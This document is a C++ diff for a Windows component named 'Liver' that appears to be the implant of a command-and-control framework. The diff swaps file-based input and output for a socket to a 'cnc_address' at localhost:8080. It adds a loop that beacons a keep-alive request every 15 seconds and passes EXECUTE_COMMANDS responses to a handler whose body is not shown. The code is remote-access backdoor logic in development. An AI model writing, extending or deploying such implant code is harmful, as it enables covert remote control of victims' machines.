@@ -9,6 +9,7 @@
 #include "Communicators/Protocol/KeepAliveRequest.hpp"
 #include "Communicators/Protocol/SendRandomResponse.hpp"
 #include "Filesystem/File.hpp"
+#include "Networking/Socket.hpp"
 #include "Synchronization/Event.hpp"
 
 Liver::Liver(Event::Ptr quit_event, ICommandFactory::Ptr command_factory, ICommunicator::Ptr communicator) :
@@ -21,41 +22,52 @@ Liver::Liver(Event::Ptr quit_event, ICommandFactory::Ptr command_factory, ICommu
 
 void Liver::run()
 {
-	TRACE(L"running liver");
+	TRACE(L"running liver")
 
-	std::shared_ptr<IResponse> response = m_communicator->send(std::make_unique<KeepAliveRequest>());
-	switch (response->type())
+	static constexpr Time::Duration ITERATION_TIMEOUT = Time::Seconds(15);
+	while (m_quit_event->wait(ITERATION_TIMEOUT) == WaitStatus::TIMEOUT)
 	{
-	case IResponse::Type::SEND_RANDOM:
-	{
-		auto send_random_response = std::dynamic_pointer_cast<SendRandomResponse>(std::move(response));
-		TRACE(L"SendRandomResponse random: ", send_random_response->value())
-		break;
+		try
+		{
+			TRACE(L"liver iteration")
+			IRequest::Ptr request = make_request();
+			std::shared_ptr<IResponse> response = m_communicator->send(std::move(request));
+			handle_response(std::move(response));
+		}
+		catch ([[maybe_unused]] const WinApiException& ex)
+		{
+			TRACE("uncaught WinApiException with code ", ex.code(), " and error ", ex.error())
+		}
+		catch ([[maybe_unused]] const Exception& ex)
+		{
+			TRACE("uncaught Exception with code ", ex.code())
+		}
+		catch ([[maybe_unused]] const CriticalException&)
+		{
+			TRACE("uncaught CriticalException")
+		}
+		catch ([[maybe_unused]] const std::exception& ex)
+		{
+			TRACE("uncaught std::exception: ", ex.what())
+		}
+		catch (...)
+		{
+			TRACE("uncaught unknown or critical exception")
+		}
 	}
 
-	case IResponse::Type::EXECUTE_COMMANDS:
-	{
-		const auto execute_commands_response = std::dynamic_pointer_cast<ExecuteCommandsResponse>(std::move(response));
-		handle_execute_commands(*execute_commands_response);
-		break;
-	}
-
-	default:
-		throw Exception(ErrorCode::UNCOVERED_ENUM_VALUE);
-	}
-
-	TRACE(L"finished liver");
+	TRACE(L"finished liver")
 }
 
 std::unique_ptr<Liver> Liver::create([[maybe_unused]] const Buffer& liver_configuration)
 {
+	static constexpr uint32_t LOCALHOST = 0x7f000001;
+	static constexpr uint16_t DEFAULT_PORT = 8080;
+	static constexpr SocketAddress cnc_address = {LOCALHOST, DEFAULT_PORT};
 	return std::make_unique<Liver>(
 		std::make_shared<Event>(quit_event_name(), Event::Type::MANUAL_RESET),
 		std::make_unique<JsonCommandFactory>(),
-		std::make_unique<RawCommunicator>(
-			std::make_shared<File>(L"C:\\Users\\alper\\input.txt", File::Mode::READ, File::Disposition::OPEN),
-			std::make_shared<File>(L"C:\\Users\\alper\\output.txt", File::Mode::WRITE, File::Disposition::OVERRIDE)
-		)
+		RawCommunicator::from_stream(std::make_shared<Socket>(cnc_address))
 	);
 }
 
@@ -63,6 +75,36 @@ std::wstring Liver::quit_event_name()
 {
 	static constexpr std::wstring_view QUIT_EVENT_NAME = L"LiverEvent";
 	return std::wstring{Event::GLOBAL_NAMESPACE} + std::wstring{QUIT_EVENT_NAME};
+}
+
+IRequest::Ptr Liver::make_request()
+{
+	return std::make_unique<KeepAliveRequest>();
+}
+
+void Liver::handle_response(IResponse::Ptr response)
+{
+	switch (response->type())
+	{
+	case IResponse::Type::SEND_RANDOM:
+	{
+		const auto send_random_response = std::dynamic_pointer_cast<SendRandomResponse>(std::move(response));
+		TRACE(L"SendRandomResponse random: ", send_random_response->value())
+		break;
+	}
+
+	case IResponse::Type::EXECUTE_COMMANDS:
+	{
+		const auto execute_commands_response = std::dynamic_pointer_cast<ExecuteCommandsResponse>(
+			std::move(response)
+		);
+		handle_execute_commands(*execute_commands_response);
+		break;
+	}
+
+	default:
+		throw Exception(ErrorCode::UNCOVERED_ENUM_VALUE);
+	}
 }
 
 void Liver::handle_execute_commands(const ExecuteCommandsResponse& response)
